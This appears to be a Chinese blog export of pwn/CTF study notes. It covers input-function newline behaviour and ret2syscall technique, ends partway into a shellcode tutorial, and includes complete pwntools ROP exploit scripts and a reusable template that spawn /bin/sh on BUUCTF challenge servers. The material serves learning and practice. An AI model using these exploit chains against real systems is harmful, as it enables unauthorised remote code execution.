<p>我们现在来分情况讨论read，它只有三种可能<br>第一种情况，<em>read的第三个参数大于了实际输入的内容的字节数</em><br>那么此时，<strong>输入到缓冲区的内容都被读取到了read第二个参数指定的地址</strong>，这里就要注意，我们用sendline发送是数据就相当于在原本的发送的数据结尾再加上一个回车。在pwn题中，大多时候read第二个参数指定的地址都是写到了栈里面<font color=red><em><strong>也就是说不仅仅read会把你输入的数据存入栈中，还会把这个回车（ASCII码也就是0a）存入到栈中，</strong></em></font>当然你可能大部分时候，都不会对那个存入0a的内存单元进行操作，因此是不影响我们获取shell的但事实上，此时的回车已经影响到栈中数据，<em><strong>我们平常使用sendline可能没有因为这个原因受到影响，仅仅是我们没有用到那个被0a影响的数据而已</strong></em>。<u>我们可以看到下面这个图片①处没有0a(回车)②处有0a③是正常的栈空间的内容④可以看到原本正常的内容，可最后的末尾却被覆盖成0a了</u>。最关键的就是在BUUCTF的pwnable_start这道题，这个被干扰的数据，我们还需要使用，因此在这里面对read函数的时候不可以用sendline，只能使用send。<br><img src="/../img/2706180-20220129192231393-1289193521.png"></p>
<p>第二是，我们输入的字节数，等于了count的字节（不包括回车）。<br>这就意味着，我们的数据时可以正常存入到指定的地址的，也就是说即使我们使用sendline栈中也并不会写入0a。但，这就可以高枕无忧了么？别忘了，<strong>我们输入的数据先是放入了缓冲区中，再从缓冲区中写到了指定的地址，虽然sendline的回车没有被写进去，但是回车停留在了缓冲区中。</strong>接下来如果有gets函数需要获取输入的话，<font color=red><em><strong>gets函数会因为这个缓冲区里的回车直接结束，不会从用户这里获取输入。</strong></em></font></p>
<p>第三是，我们输入的字节数，超过了count的字节，此时用这个实验来解释，再好不过了</p>
<p><img src="/../img/2706180-20220129192252767-1481032805.png"></p>
<p><em>可以发现输入了20个1，但由于read只能从缓冲区里面接收16个字节，因此执行完read函数之后，它的缓冲区里面还剩4个1和一个回车。但由于scanf的性质是，从缓冲区里面读入内容，遇见空白符停止，并且不读入空白符，因此a的内容是4个1。最后由于缓冲区只剩了一个回车，被gets读到之后，把回车丢弃了，因此直接声明了gets的结束，并且gets什么都没有读到</em>。<strong>因此当输入的字节数，超过了第三个字节的参数，就如同第二种情况一样，多出来的内容都会停留在缓冲区中（包括回车，这个回车用sendline发送payload，才会有回车）</strong></p>
<h1 id="gets函数"><a href="#gets函数" class="headerlink" title="gets函数"></a>gets函数</h1><p><em>使用 gets() 时，系统会将最后输入的换行符（也就是回车）从缓冲区中取出来，然后给舍弃，因此缓冲区中不会遗留换行符</em>。gets函数尽管会溢出，但是由于它会把自身发送的回车给从缓冲区中丢弃，<strong>因此遇见gets函数，就不用考虑sendline和send的区别。但是吧，面对这个函数，你不用sendline还不行，因为它需要回车来声明你输入的结束，尽管它会把\n丢弃</strong>。并且值得注意的就是，如果当gets溢出的话（我指的是数组溢出），那么它会在你发送所有数据之后会在最后填上一个00，如果不溢出的话，就不会出现这个00。使用gets输入的字节，正好和创建数组的大小一样的话，也会溢出（可能是因为回车的原因，尽管丢弃了，但还是会在输入的字符串结尾填上一个00），也就是说，如果用gets输入溢出数组的话，它会和read的第一种情况一样，把00写入栈中，也会干扰栈中数据。</p>
<h1 id="scanf函数"><a href="#scanf函数" class="headerlink" title="scanf函数"></a>scanf函数</h1><p>而scanf(‘%s’,c)的时候，**scanf是从第一个非空白字符（空格 换行 制表符）开始读入的，就是你输入的数据，在按下回车的之前，<font color=red><em>输入的数据都会被存储在输入缓冲区（包括回车）</em></font>**，当按下回车键之后，scanf就会开始<u>从输入缓冲区里面读取数据</u>，把读取的数据都传送到你指定的地址，直到遇见了空白符<br>然后停止。<font color=red><em><strong>它仅仅是遇见空白符停止了，但是空白符以及空白符后面的内容依然在输入缓冲区里面。</strong></em></font></p>
<p>如果再遇见gets函数的话，gets函数会从缓冲区里面继续从空白符开始读（空格），然后遇见了回车停止，并把回车丢弃，此时我们根本无法用gets函数输入，因为它在缓冲区里面就遇到了换行符。用下面的图片举例</p>
<p><img src="/../img/2706180-20220129192309307-314700424.png"></p>
<p><img src="/../img/2706180-20220129192327106-1249123632.png"><br>scanf函数也存在溢出，如果对它用sendline发送数据的话，是不可能被回车（0a）所影响栈中数据的。但是吧，通过实验发现，面对scanf的时候，不用sendline还不行，必须要用sendline，send发送的话，会在执行scanf的时候卡住。因此面对scanf(“%s”)的时候，我们用sendline发送，时刻要注意它的回车会留着缓冲区里面，可能影响接下来程序的执行情况。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong><u><em>使用sendline的结果取决于输入的函数</em></u></strong></p>
<p>如果是read函数的话，<font color=red>①只有当count的字节数大于你所输入的字节数，这个回车才不会产生任何的影响，而多出来的回车也会被当成输入数据正常存入栈中（如果输入的地址是栈的话）；②当count字节数等于你所输入的字节数，那么最后的sendline的回车会停留在栈中（没有在缓冲区中），此时它是不正常存入，因为这个回车的缘故，已经造成了溢出；③当count字节数小于你所输入的字节数，那么没有输入进指定地址的内容，都会停留在输入缓冲区，有可能会影响之的输入。<strong>但值得一提的是使用read函数，我们可以用send来发送数据，这样就可以确保万无一失</strong>。（</font><strong>如果是gets函数或者scanf函数</strong>，我们没有办法选择，<strong>只能使用sendline</strong>，这两种函数只有遇见sendline发送的回车，才会停止读入。<strong>gets函数会清空缓冲区里的回车，而scanf则不会清空回车。因此scanf可能会因为没有清空回车的缘故，对之后的程序输入可能造成影响，但是如果gets函数溢出了数组限制的话，会异常的在输入的字符串结尾填上一个00存入栈中。此时的00也有可能会覆盖原本栈中的数据</strong>，另外就是遇见fgets的话，也是没的选，只能用sendline</p>
]]></content>
      <categories>
        <category>探究</category>
      </categories>
      <tags>
        <tag>探究</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2syscall的做题思路</title>
    <url>/posts/10ff9a38.html</url>
    <content><![CDATA[<p>​	ret2syscall需要寻找的指令的思路和构造shellcode的思路是一样的，只不过ret2syscall获取的指令算是就地取材，而ret2shellcode创造指令算是无中生有。<span id="more"></span>在32位程序中，我们要系统调用，那就需要把系统调用号传入eax寄存器，然后需要把ecx和edx的寄存器给清空。最后就是需要去把参数&#x2F;bin&#x2F;sh的地址存入ebx寄存器。而我感觉ret2syscall的难点也就是在最后这个把参数地址存入ebx寄存器这里了。</p>
<h1 id="怎么把参数-x2F-bin-x2F-sh写入程序中？写到哪？"><a href="#怎么把参数-x2F-bin-x2F-sh写入程序中？写到哪？" class="headerlink" title="怎么把参数&#x2F;bin&#x2F;sh写入程序中？写到哪？"></a>怎么把参数&#x2F;bin&#x2F;sh写入程序中？写到哪？</h1><h2 id="①写到哪"><a href="#①写到哪" class="headerlink" title="①写到哪"></a>①写到哪</h2><p>首先回答写到哪，<strong>我们要尽可能写到bss段</strong>，因为在不开pie的情况下，<strong>bss段的地址是不会变的</strong>，这意味着，我们可以用IDA看一下bss段的地址然后选定一个我们写入参数的地址，然后我们exp就可以直接写上这个地址了。但是如果我们想写到栈里面，确实用gdb也可以看到写在了哪个内存单元里面，但是这个地址是会变的，把exp上写入我们刚才用gdb看到的地址。解决办法也有，那就是需要泄露程序的一个内存单元地址，然后利用偏移，来计算出我们存放&#x2F;bin&#x2F;sh参数的地址。但是这样多少有点麻烦，并且很多时候，我们是无法泄露程序中的地址的，因此我们选择写到bss段。</p>
<h2 id="②怎么写"><a href="#②怎么写" class="headerlink" title="②怎么写"></a>②怎么写</h2><p>再回答第一个问题，怎么写入程序中?目前我遇见了两种题型，分别对应的两种方法。</p>
<h3 id="怎么写——第一种方法"><a href="#怎么写——第一种方法" class="headerlink" title="怎么写——第一种方法"></a>怎么写——第一种方法</h3><p><strong>第一种方法是去搜索gadget，寻找pop [ecx]这类对地址内容操作的指令</strong>。然后我们利用如下payload可以达到将参数&#x2F;bin&#x2F;sh写入bss段。（<em>并且这部分的payload需要放到返回地址处使用</em>）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=p32(pop_ecx_addr)+p32(bss_addr)+p32(pop_[ecx]_addr)+<span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr+<span class="number">4</span>)+p32(pop_[ecx]_addr)+<span class="string">&#x27;/sh\x00&#x27;</span></span><br></pre></td></tr></table></figure>

<p>我先来解释一下这个payload。</p>
<p>首先pop_ecx_addr指的是pop ecx;ret这个指令的地址   bss_addr指的将参数写入bss段的具体地址</p>
<p>pop_[ecx]_addr指的是pop dword ptr [ecx];ret这个指令的地址 (这里我写[ecx]是为了方便理解，我记得实际的exp里面，不能使用方括号）（另外这里不一定要是ecx，别的寄存器也可以，这里只是举个例子）然后参数&#x2F;bin就是我们的参数</p>
<p><strong>至于这个bss_addr+4是上面bss_addr的地址的衔接，因为参数&#x2F;bin&#x2F;sh需要两个内存单元存放，因此在这里将上面的地址加4，就存到了下面的内存单元</strong>。最后的\x00是用来声明字符串的结束。</p>
<p>下面我画图来演示下这个过程是怎么实现的</p>
<p><img src="/../img/2706180-20220127203642840-2033345372.png"></p>
<p><em>但是这样搜寻gadget的手段，是有弊端的，因为有时候程序可能恰好就没有类似于pop [ecx]这样的指令。</em></p>
<h3 id="怎么写——第二种方法"><a href="#怎么写——第二种方法" class="headerlink" title="怎么写——第二种方法"></a>怎么写——第二种方法</h3><p>因此我们可以用第二种方法，等到可以溢出的时候，用rop，先去把返回地址处放置一个read函数，然后再把&#x2F;bin&#x2F;sh写入指定的地址（把该地址放在read函数第二个参数即可）然后再随便找一个连续三次pop的指令（不连续应该也是可以的，反正就要进行三次pop，将read函数的三个参数先从栈顶给弹出来）<br>接着再进行ret2syscall，参数传完了，剩下的只要找些gadget片段进行ret2syscall即可。如果没有read函数的话，理论来说我们是可以系统调用read函数的，但是我试了一下，当用int 0x80来系统调用read函数之后，int 0x80指令的后面不是ret指令，没有办法再去衔接后面的gadget了。不过目前还没有遇见过系统调用read函数再ret2syscall的题目。</p>
<p>当使用这两种方法其中的一种之后，传参完毕，如此剩下的就是去搜寻我们需要的gadget片段，最后系统调用即可。</p>
<h2 id="怎么搜寻gadget片段？"><a href="#怎么搜寻gadget片段？" class="headerlink" title="怎么搜寻gadget片段？"></a>怎么搜寻gadget片段？</h2><p>我们需要借助ROPgadget工具，这个需要自行安装，安装完成后。</p>
<p>比如我们要搜索int 0x80指令的片段输入ROPgadget –binary | grep ‘int 0x80’即可，如果要搜索pop eax ; ret指令片段，同理输入ROPgadget –binary | grep ‘pop eax ; ret’即可</p>
<p><img src="/../img/2706180-20220127203659117-356770839.png"></p>
<p><img src="/../img/2706180-20220127203712667-1709918883.png"></p>
<p>如此，我们就可以找到对应指令的地址了。</p>
<p>最后要介绍一下ret2syscall中怎么进行传参。除去&#x2F;bin&#x2F;sh这参数的传参方式外（该传参方式上面已经介绍过了），剩下的传参方式很单一，先去找到要传参赋值的寄存器，然后去用ROPgadget搜索pop 寄存器；ret指令片段的地址即可。</p>
<p>以eax存入11来举例</p>
<p>构造<code>payload位payload=p32(pop_eax_addr)+p32(11)</code>这样能达到效果的原因是执行pop eax的时候，栈顶就是11，此时就是把栈顶的11给弹进eax里面，即完成了传参。</p>
<p>掌握了上述这些之后，就可以去完成ret2syscall相关的题目了。</p>
<h1 id="两道例题"><a href="#两道例题" class="headerlink" title="两道例题"></a>两道例题</h1><p>最后拿两道例题来演示一下。</p>
<p>分别是BUUCTF上的inndy_rop和BUUCTF的cmcc_simplerop，这两道题分别考察了两种写入参数的方法。</p>
<p>题目链接</p>
<p>inndy_rop         <a href="https://buuoj.cn/challenges#inndy_rop">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>cmcc_simplerop     <a href="https://buuoj.cn/challenges#cmcc_simplerop">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>这里我分别给出wp</p>
<hr>
<h2 id="inndy-rop"><a href="#inndy-rop" class="headerlink" title="inndy_rop"></a>inndy_rop</h2><p><img src="/../img/2706180-20220127203727516-678751435.png"></p>
<p>此时看保护还是正常的，但是用IDA就发现不对劲了<br><img src="/../img/2706180-20220127203739873-417953413.png"></p>
<p><img src="/../img/2706180-20220127203751365-839458355.png"></p>
<p>上面的那个就是主函数</p>
<p>先是发现左侧的函数表有很多很多的函数，说明这个程序是静态链接，静态链接就意味着没法去ret2libc了，因为ret2libc本来就是去用动态库里面的系统函数，可是现在没有动态库了，因此就要用ret2syscall</p>
<p>此时用到上面，我提到的第一种方法将&#x2F;bin&#x2F;sh写入bss段</p>
<p>这里要注意的是搜[ecx]指令地址的时候 要这么搜，要用反斜杠用来转义<br><img src="/../img/2706180-20220127203803936-1340958560.png"></p>
<p><img src="/../img/2706180-20220127203818420-1093356739.png"></p>
<p>思路就是系统调用execve，然后把参数&#x2F;bin&#x2F;sh写入bss段</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">d=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25149</span>)</span><br><span class="line">d=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">int_0x80_addr=<span class="number">0x0806c943</span></span><br><span class="line">bss_addr=<span class="number">0x080EBB81</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#bss_addr=e.bss()</span></span><br><span class="line">pop_eax_addr=<span class="number">0x080b8016</span></span><br><span class="line">pop_ebx_addr=<span class="number">0x080481c9</span></span><br><span class="line">pop_ecx_addr=<span class="number">0x080de769</span></span><br><span class="line">pop_edx_addr=<span class="number">0x0806ecda</span></span><br><span class="line">pop_in_ecx_addr=<span class="number">0x0804b5ba</span></span><br><span class="line">payload=<span class="number">16</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr) <span class="comment">#利用ecx当一个媒介，以此来让/bin/sh写到bss段，最后的00用来截断，不然execve接收参数的时候，它不知道什么时候参数截止。</span></span><br><span class="line">payload+=p32(pop_in_ecx_addr)+<span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr+<span class="number">4</span>)</span><br><span class="line">payload+=p32(pop_in_ecx_addr)+<span class="string">&#x27;/sh\x00&#x27;</span></span><br><span class="line">payload+=p32(pop_eax_addr)+p32(<span class="number">0xb</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)+p32(bss_addr)<span class="comment">#把ebx存入参数/bin/sh的地址</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_edx_addr)+p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(int_0x80_addr)</span><br><span class="line">d.sendline(payload)</span><br><span class="line">d.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a>cmcc_simplerop</h2><p><img src="/../img/2706180-20220127203856048-493266564.png"></p>
<p><img src="/../img/2706180-20220127203918982-250461252.png"></p>
<p>没有canary，并且这里存在溢出，因此我们可以rop。</p>
<p><img src="/../img/2706180-20220127204005942-290500809.png"></p>
<p>但是紧接着，就发现左边是这么一坨函数，<strong>就意味着这道题是静态链接，静态链接就意味着我们没办法ret2libc，没有后门函数，没办法ret2text，开了NX保护，没办法ret2shellcode。</strong></p>
<p><strong>因此只能是ret2syscall了</strong>。</p>
<p>我们现在需要去找gadget片段。</p>
<p><strong>因为我们需要设置eax,ebx,ecx,edx这四个寄存器的参数，因此需要去分别找pop这四个寄存器的指令。</strong></p>
<p><img src="/../img/2706180-20220127204033314-1369511097.png"></p>
<p>这里直接就发现了连续pop三个寄存器的指令，比较nice。</p>
<p><img src="/../img/2706180-20220127204105424-1865663775.png"></p>
<p>寄存器找完了，现在最大的问题就是怎么把&#x2F;bin&#x2F;sh给传进去？</p>
<p>这道题没有类似于pop [ecx]这类指令，因此我们只能另辟蹊径。</p>
<p><strong>因为存在read函数(如果没有read函数的话，那就系统调用，不过我试了一下，没成功，但原理上是可行的)<strong>，因此我们可以先把read的地址放到返回地址，再执行一次read，将参数写入我们指定的bss段地址，（</strong>为什么要写入bss段，是因为没开pie的情况下，bss段地址是不变的，并且这道题的bss段是可写，这样我们写入参数之后，直接再拿写入的那个bss地址当做ebx的参数即可，如果是写入栈中的话，还需要泄露栈中地址</strong>）</p>
<p> 并且值得一提的是，我们<font color=red><strong>之后使用pop eax+p32(0xb)这种指令的前提是此时栈顶要是0xb才可以，但是当我们执行read之后，它的三个参数都是在栈顶的，因此我们需要pop三次，把read的参数先给弹出来，这样才能顺理传之后的参数</strong></font>。</p>
<p> <strong>最后要注意的一个点就是，这道题用IDA看，距离返回地址是0x18,但是用gdb调试一下发现，它距离返回地址实际上是0x20。</strong></p>
<p> 最后就是exp了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27707</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">pop_eax=<span class="number">0x080bae06</span></span><br><span class="line">pop_ebx=<span class="number">0x080481c9</span></span><br><span class="line">pop_ecx_ebx=<span class="number">0x0806e851</span></span><br><span class="line">pop_edx=<span class="number">0x0806e82a</span></span><br><span class="line">int_0x80=<span class="number">0x080493e1</span></span><br><span class="line">bss_addr=<span class="number">0x080EAFF0</span></span><br><span class="line">read_addr=<span class="number">0x0806CD50</span></span><br><span class="line">pop_edx_ecx_ebx=<span class="number">0x0806e850</span></span><br><span class="line">payload=<span class="number">0x20</span>*<span class="string">&#x27;a&#x27;</span>+p32(read_addr)+p32(pop_edx_ecx_ebx)<span class="comment">#这三个pop处于read函数的返回地址，连续pop三次，把栈顶的内容弹出来</span></span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">8</span>)<span class="comment">#read函数的参数</span></span><br><span class="line">payload+=p32(pop_eax)+p32(<span class="number">11</span>)+p32(pop_edx_ecx_ebx)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bss_addr)<span class="comment">#弹给eax的内容是11，因为11是32位程序execve的系统调用号</span></span><br><span class="line">payload+=p32(int_0x80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#这里一定要输入这个\x00去截断</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>##picoctf_2018_can_you_gets_me</p>
<p><img src="/../img/2706180-20220303194850099-1407586466.png"></p>
<p><img src="/../img/2706180-20220303194913108-59758844.png"></p>
<p>发现是静态链接，之前静态链接就是直接去用ropgadget搜了ropchain，然后我这道题直接搜了一下。<br>用下面这个命令搜（a是文件名）<br><img src="/../img/2706180-20220303195629484-228134511.png"><br>  <img src="/../img/2706180-20220303194931739-320603106.png"></p>
<p> <img src="/../img/2706180-20220303194955331-2123755447.png"><br>发现没有canary，并且有溢出<br>那就没少好说的了，看一下溢出偏移</p>
<p><img src="/../img/2706180-20220303194941901-2106523077.png"></p>
<p>发现溢出偏移为28，然后直接打就行了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack  <span class="comment">#这里必须要引入这个包，不然是打不通的</span></span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29254</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./a&#x27;)</span></span><br><span class="line">offset=<span class="number">28</span></span><br><span class="line">p=offset*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de955</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806cc25</span>) <span class="comment"># int 0x80</span></span><br><span class="line">r.sendline(p)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>这就是定死的模板，没什么好说的。</p>
<p>如果手写的话也可以，原理的话上面解释过了，这个也可以当做模板来用，需要修改的参数，我后面加了三个*。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#d=remote(&#x27;node4.buuoj.cn&#x27;,25149)#***</span></span><br><span class="line">d=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">int_0x80_addr=<span class="number">0x0806cc25</span> <span class="comment">#*** 这些片段的话，直接用Ropgadget搜就可以了</span></span><br><span class="line">bss_addr=<span class="number">0x080e9000</span>      <span class="comment">#***这个用vmmap看一下哪里是可写的，然后放上这段可写的地址就行了</span></span><br><span class="line">pop_eax_addr=<span class="number">0x080b81c6</span>  <span class="comment">#***</span></span><br><span class="line">pop_ebx_addr=<span class="number">0x080481c9</span>  <span class="comment">#***</span></span><br><span class="line">pop_ecx_addr=<span class="number">0x080de955</span>  <span class="comment">#***</span></span><br><span class="line">pop_edx_addr=<span class="number">0x0806f02a</span>  <span class="comment">#***</span></span><br><span class="line">pop_in_ecx_addr=<span class="number">0x0804b5ea</span><span class="comment">#*** 这个地方用这个指令找</span></span><br><span class="line"><span class="comment"># ROPgadget --binary  a | grep &#x27;pop dword ptr \[ecx\]&#x27; 这里不一定要ecx的，别的寄存器也可以</span></span><br><span class="line"></span><br><span class="line">payload=<span class="number">28</span>*<span class="string">&#x27;a&#x27;</span> <span class="comment">#***</span></span><br><span class="line"></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr) <span class="comment">#利用ecx当一个媒介，以此来让/bin/sh写到bss段，最后的00用来截断，不然execve接收参数的时候，它不知道什么时候参数截止。</span></span><br><span class="line">payload+=p32(pop_in_ecx_addr)+<span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr+<span class="number">4</span>)</span><br><span class="line">payload+=p32(pop_in_ecx_addr)+<span class="string">&#x27;/sh\x00&#x27;</span></span><br><span class="line">payload+=p32(pop_eax_addr)+p32(<span class="number">0xb</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)+p32(bss_addr)<span class="comment">#把ebx存入参数/bin/sh的地址</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_edx_addr)+p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(int_0x80_addr)</span><br><span class="line">d.sendline(payload)</span><br><span class="line">d.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>ret2syscall</tag>
      </tags>
  </entry>
  <entry>
    <title>用汇编语言构造简单的shellcode（64位&amp;&amp;32位）以及将汇编语言转换成机器码的方法</title>
    <url>/posts/5062ac9d.html</url>
    <content><![CDATA[<h1 id="1、什么是shellcode"><a href="#1、什么是shellcode" class="headerlink" title="1、什么是shellcode"></a>1、什么是shellcode</h1><p>这里我谈谈自己的理解，<code>shellcode</code> 就是一段可执行的机器码，如果可以让 <code>CPU</code> 从 <code>shellcode</code> 首字节开始往下执行，那么 <code>shellcode</code> 执行完毕就会达到编写者想要的目的（<code>shellcode</code> 不一定非要是获取 <code>shell</code> 的机器码），至少初学者先这么理解应该是没什么问题的。</p>
<span id="more"></span>

<h1 id="2、怎么用汇编语言构造简单的shellcode-64位"><a href="#2、怎么用汇编语言构造简单的shellcode-64位" class="headerlink" title="2、怎么用汇编语言构造简单的shellcode(64位)"></a>2、怎么用汇编语言构造简单的shellcode(64位)</h1><p>前置知识：</p>
<p>① <code>x86_64</code> 架构中执行系统调用负责传参的前三个寄存器分别是 <code>rdi</code> <code>rsi</code> <code>rdx</code></p>
<p>②<code>64</code> 位系统调用号通过查看 <code>linux</code> 上的 <code>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</code> 文件就可以获取</p>
<p>③系统调用号放入 <code>rax</code> 寄存器，然后 <code>syscall</code> 就可以执行对应的系统调用函数</p>
<p>​		</p>
<blockquote>
<p>   首先我们的<strong>目的是执行 execve(“&#x2F;bin&#x2F;sh”,0,0)</strong> 从而获取shell</p>
<p>   因此，需要干三件事情</p>
